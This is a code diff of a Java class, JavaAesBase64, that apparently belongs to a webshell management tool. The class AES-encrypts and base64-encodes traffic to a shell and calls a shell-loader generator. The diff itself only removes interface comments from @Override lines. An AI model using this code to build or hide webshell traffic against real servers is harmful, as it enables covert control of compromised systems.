@@ -23,7 +23,7 @@ public class JavaAesBase64 implements Cryption {
     private ShellEntity shell;
     private boolean state;
 
-    @Override // core.imp.Cryption
+    @Override 
     public void init(ShellEntity context) {
         this.shell = context;
         this.http = this.shell.getHttp();
@@ -49,7 +49,7 @@ public class JavaAesBase64 implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] encode(byte[] data) {
         try {
             return (this.pass + "=" + URLEncoder.encode(functions.base64Encode(this.encodeCipher.doFinal(data)))).getBytes();
@@ -59,7 +59,7 @@ public class JavaAesBase64 implements Cryption {
         }
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] decode(byte[] data) {
         try {
             return this.decodeCipher.doFinal(functions.base64Decode(findStr(data)));
@@ -73,17 +73,17 @@ public class JavaAesBase64 implements Cryption {
         return functions.subMiddleStr(new String(respResult), this.findStrLeft, this.findStrRight);
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean isSendRLData() {
         return true;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public boolean check() {
         return this.state;
     }
 
-    @Override // core.imp.Cryption
+    @Override 
     public byte[] generate(String password, String secretKey) {
         return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
     }
